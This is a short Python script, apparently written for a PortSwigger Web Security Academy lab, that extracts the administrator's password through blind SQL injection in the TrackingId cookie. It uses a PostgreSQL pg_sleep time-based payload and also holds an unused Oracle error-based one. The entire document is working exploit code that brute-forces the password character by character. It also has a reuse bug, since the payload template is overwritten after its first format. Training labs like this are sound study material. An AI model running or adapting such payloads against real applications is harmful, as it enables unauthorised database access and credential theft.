#[ODKRYWANIE HASLA ADMINISTRATORA]

import requests, time

url = 'https://0ae800a8042617bac01c506700cc00b6.web-security-academy.net/'
cookie = {"TrackingId" : "jzvclnEDFP0ULLrl'||(SELECT CASE WHEN SUBSTR(password, {},1)='{}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||';", "session" : "rP7VkcmG61uFKo7IJIcg1XWIERPGErV7"}



result = ''
charters = '1234567890qwertyuiopasdfghjklzxcvbnm'
Ttime = 0
for x in range(1, 22):
    for pay in charters:
        
        cookie = {"TrackingId" : "iBxjaM6mXF3OeRNnTrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{},1)='{}')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--;", "session" : "wI6xGdYiNdD7KIUNNSe3lvR1vQ8h18uw"}

        newCookie = cookie
        newCookie['TrackingId'] = newCookie['TrackingId'].format(str(x), pay)
        
        Ttime = time.time()
        response = requests.get(url, cookies=newCookie)
    
        print("Password:["+result+"]")
        print("Checking:{"+pay+"}")

        if((time.time() - Ttime) > 5):
            result += pay
            break
